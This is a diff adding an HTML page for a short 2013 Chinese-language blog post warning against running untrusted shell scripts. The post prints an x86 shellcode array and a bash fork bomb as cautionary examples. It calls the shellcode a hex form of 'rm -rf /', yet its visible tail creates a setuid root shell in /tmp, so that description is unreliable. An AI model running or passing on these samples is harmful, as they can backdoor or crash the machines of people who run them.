@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="zh-tw">
+<head>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+  	<meta property="og:title" content=" 好奇殺死一隻貓 &middot;  kfei&#39;s brainfuck" />
+  	<meta property="og:site_name" content="kfei&#39;s brainfuck" />
+  	<meta property="og:url" content="https://kfei.net/posts/2013/10/%E5%A5%BD%E5%A5%87%E6%AE%BA%E6%AD%BB%E4%B8%80%E9%9A%BB%E8%B2%93/" />
+
+    
+    <script>
+      var addy = window.location.href;
+      if (addy.indexOf('http:') === 0 && addy.indexOf('http://localhost') != 0 ) {
+          window.location.href = addy.replace(/^http/, 'https')
+      }
+    </script>
+
+    
+  	<meta property="og:type" content="article" />
+
+    <meta property="og:article:published_time" content="2013-10-29T02:12:00&#43;08:00" />
+
+    
+    <link rel="stylesheet" href="https://yandex.st/highlightjs/8.0/styles/github.min.css">
+    <script src="https://yandex.st/highlightjs/8.0/highlight.min.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    
+    <meta property="og:article:tag" content="geek" />
+    
+    
+
+  <title>
+     好奇殺死一隻貓 &middot;  kfei&#39;s brainfuck
+  </title>
+
+    <meta name="description" content="To dream and to build. To fail and to succeed." />
+
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="shortcut icon" href="https://kfei.net/posts/images/favicon.ico">
+	  <link rel="apple-touch-icon" href="https://kfei.net/posts/images/apple-touch-icon.png" />
+
+    <link rel="stylesheet" type="text/css" href="https://kfei.net/posts/css/screen.css" />
+    <link rel="stylesheet" type="text/css" href="https://kfei.net/posts/css/nav.css" />
+    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic|Open+Sans:700,400|Inconsolata" />
+
+
+    
+      
+          <link href="https://kfei.net/posts/index.xml" rel="alternate" type="application/rss+xml" title="kfei&#39;s brainfuck" />
+      
+      
+    
+    <meta name="generator" content="Hugo 0.15" />
+
+    <link rel="canonical" href="https://kfei.net/posts/2013/10/%E5%A5%BD%E5%A5%87%E6%AE%BA%E6%AD%BB%E4%B8%80%E9%9A%BB%E8%B2%93/" />
+
+    
+    <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+      ga('create', 'UA-75632970-1', 'auto');
+      ga('send', 'pageview');
+
+    </script>
+    
+
+    
+</head>
+<body class="nav-closed">
+
+  <div class="nav">
+    <h3 class="nav-title">Menu</h3>
+    <a href="#" class="nav-close">
+        <span class="hidden">Close</span>
+    </a>
+    <ul>
+        
+        
+        
+            
+            <li class="nav-opened" role="presentation">
+            	<a href="https://kfei.net/posts/">Posts</a>
+            </li>
+        
+            <h3>Elsewhere</h3>
+            <li class="nav-opened" role="presentation">
+            	<a href="https://github.com/kfei">GitHub repos</a>
+            </li>
+        
+            
+            <li class="nav-opened" role="presentation">
+            	<a href="https://facebook.com/g8.kfei">Facebook timeline</a>
+            </li>
+        
+            
+            <li class="nav-opened" role="presentation">
+            	<a href="https://twitter.com/linkfei">Twitter murmur</a>
+            </li>
+        
+            <h3>Contact me</h3>
+            <li class="nav-opened" role="presentation">
+            	<a href="https://keybase.io/kfei">Keybase</a>
+            </li>
+        
+    </ul>
+    
+    
+    <a class="subscribe-button icon-feed" href="https://kfei.net/posts/index.xml">Subscribe</a>
+    
+</div>
+<span class="nav-cover"></span>
+
+
+ <div class="site-wrapper">
+
+
+
+
+<header class="main-header post-head no-cover">
+  <nav class="main-nav clearfix">
+
+
+  
+  
+      <a class="menu-button" href="#"><span class="burger">&#9776;</span><span class="word">Menu</span></a>
+  
+  </nav>
+</header>
+
+
+
+<div class="post-template">
+<main class="content" role="main">
+
+
+
+
+  <article class="post post">
+
+    <header class="post-header">
+        <h1 class="post-title">好奇殺死一隻貓</h1>
+        <small></small>
+
+        <section class="post-meta">
+        
+          <time class="post-date" datetime="2013-10-29T02:12:00&#43;08:00">
+            Oct 29, 2013
+          </time>
+        
+         
+          <span class="post-tag small"><a href="https://kfei.net/posts/tags/geek/">#geek</a></span>
+         
+        </section>
+    </header>
+
+    <section class="post-content">
+      <p>除了不要亂點來路不明的連結外, 來路不明的 shell script 當然也不可以隨便執行哦!</p>
+
+<pre><code class="language-bash">char rmrf[] __attribute__ ((section(“.text”)))
+= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″
+“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″
+“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″
+“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″
+“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″
+“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″
+“\x6e\x2f\x73\x68\x00\x2d\x63\x00″
+“cp -p /bin/sh /tmp/.cmd; chmod 4755
+/tmp/.cmd;”;
+</code></pre>
+
+<p><strong><em>Warning:</em></strong> 這是 <code>rm –rf /</code> 的 hex 版本.</p>
+
+<pre><code class="language-bash">:(){ :|: &amp; };:
+</code></pre>
+
+<p><strong><em>Warning:</em></strong> 定義一個會 fork 自己的 bash function, 然後 fork 他&hellip;</p>
+
+    </section>
+
+
+  <footer class="post-footer">
+
+
+    
+
+    
+
+
+
+
+
+<section class="author">
+  <h4><a href="https://kfei.net/posts/">kfei</a></h4>
+  
+  <p>Hacker / Tenniser / Photographer / Diver / Entrepreneur</p>
+  
+  <div class="author-meta">
+    <span class="author-location icon-location">Kaohsiung, Taiwan</span>
+    <span class="author-link icon-link"><a href="https://kfei.net">https://kfei.net</a></span>
+  </div>
+</section>
+
+
+
+    
+<section class="share">
+  <h4>Share this post</h4>
+  <a class="icon-twitter" style="font-size: 1.4em" href="https://twitter.com/share?text=%e5%a5%bd%e5%a5%87%e6%ae%ba%e6%ad%bb%e4%b8%80%e9%9a%bb%e8%b2%93&amp;url=https%3a%2f%2fkfei.net%2fposts%2f2013%2f10%2f%25E5%25A5%25BD%25E5%25A5%2587%25E6%25AE%25BA%25E6%25AD%25BB%25E4%25B8%2580%25E9%259A%25BB%25E8%25B2%2593%2f"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+      <span class="hidden">Twitter</span>
+  </a>
+  <a class="icon-facebook" style="font-size: 1.4em" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fkfei.net%2fposts%2f2013%2f10%2f%25E5%25A5%25BD%25E5%25A5%2587%25E6%25AE%25BA%25E6%25AD%25BB%25E4%25B8%2580%25E9%259A%25BB%25E8%25B2%2593%2f"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+      <span class="hidden">Facebook</span>
+  </a>
+  <a class="icon-pinterest" style="font-size: 1.4em" href="http://pinterest.com/pin/create/button/?url=https%3a%2f%2fkfei.net%2fposts%2f2013%2f10%2f%25E5%25A5%25BD%25E5%25A5%2587%25E6%25AE%25BA%25E6%25AD%25BB%25E4%25B8%2580%25E9%259A%25BB%25E8%25B2%2593%2f&amp;description=%e5%a5%bd%e5%a5%87%e6%ae%ba%e6%ad%bb%e4%b8%80%e9%9a%bb%e8%b2%93"
+      onclick="window.open(this.href, 'pinterest-share','width=580,height=296');return false;">
+      <span class="hidden">Pinterest</span>
+  </a>
+  <a class="icon-google-plus" style="font-size: 1.4em" href="https://plus.google.com/share?url=https%3a%2f%2fkfei.net%2fposts%2f2013%2f10%2f%25E5%25A5%25BD%25E5%25A5%2587%25E6%25AE%25BA%25E6%25AD%25BB%25E4%25B8%2580%25E9%259A%25BB%25E8%25B2%2593%2f"
+     onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+      <span class="hidden">Google+</span>
+  </a>
+</section>
+
+
+
+    
+
+
+
+
+  </footer>
+</article>
+
+</main>
+</div>
+    <footer class="site-footer clearfix">
+        <section class="copyright"><a href="">kfei&#39;s brainfuck</a> </section>
+        
+    </footer>
+    </div>
+    <script type="text/javascript" src="https://kfei.net/posts/js/jquery.js"></script>
+    <script type="text/javascript" src="https://kfei.net/posts/js/jquery.fitvids.js"></script>
+    <script type="text/javascript" src="https://kfei.net/posts/js/index.js"></script>
+    
+</body>
+</html>
+
